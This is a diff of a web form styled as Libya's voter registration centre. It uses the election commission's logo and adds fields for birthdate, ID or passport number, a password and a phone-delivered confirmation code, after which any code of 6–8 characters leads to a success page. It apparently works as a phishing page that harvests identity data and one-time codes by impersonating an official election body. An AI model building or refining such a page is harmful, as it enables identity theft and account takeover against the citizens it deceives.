@@ -56,7 +56,9 @@
 
     input[type="text"],
     input[type="tel"],
-    input[type="file"] {
+    input[type="date"],
+    input[type="password"],
+    select {
       width: 100%;
       padding: 10px;
       font-size: 15px;
@@ -131,7 +133,6 @@
 
 <div class="form-container">
   <div class="logo">
-    <!-- شعار مركز الانتخابات -->
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/dc/High_Election_Commission_of_Libya_logo.png/200px-High_Election_Commission_of_Libya_logo.png" alt="شعار مركز الانتخابات">
   </div>
   <h2>مركز تسجيل الناخبين - ليبيا</h2>
@@ -147,13 +148,32 @@
     </div>
 
     <div class="form-group">
-      <label for="passport">صورة جواز السفر</label>
-      <input type="file" id="passport" name="passport" accept="image/*" required />
+      <label for="birthdate">تاريخ الميلاد</label>
+      <input type="date" id="birthdate" name="birthdate" required />
+    </div>
+
+    <div class="form-group">
+      <label for="documentType">نوع الوثيقة</label>
+      <select id="documentType" name="documentType" required>
+        <option value="">-- اختر نوع الوثيقة --</option>
+        <option value="جواز سفر">جواز سفر</option>
+        <option value="بطاقة شخصية">بطاقة شخصية</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <label for="documentNumber">رقم الوثيقة</label>
+      <input type="text" id="documentNumber" name="documentNumber" required />
     </div>
 
     <div class="form-group">
       <label for="phone">رقم الهاتف (لإستلام كود التأكيد)</label>
       <input type="tel" id="phone" name="phone" placeholder="2189XXXXXXXX" required />
+    </div>
+
+    <div class="form-group">
+      <label for="password">الرقم السري</label>
+      <input type="password" id="password" name="password" placeholder="6 أحرف أو أكثر" required />
     </div>
 
     <button type="submit">إرسال البيانات</button>
@@ -179,6 +199,14 @@
 
   form.addEventListener('submit', async function(e) {
     e.preventDefault();
+
+    const password = document.getElementById('password').value.trim();
+
+    // تحقق من الرقم السري
+    if (password.length < 6) {
+      alert("الرقم السري يجب أن يكون 6 خانات أو أكثر.");
+      return;
+    }
 
     const formData = new FormData(form);
 
@@ -207,7 +235,7 @@
     if (/^[A-Za-z0-9]{6,8}$/.test(code)) {
       codeError.style.display = 'none';
       confirmCodeInput.disabled = true;
-      window.location.href = "success.html"; // صفحة النجاح
+      window.location.href = "success.html";
     } else {
       codeError.style.display = 'block';
     }
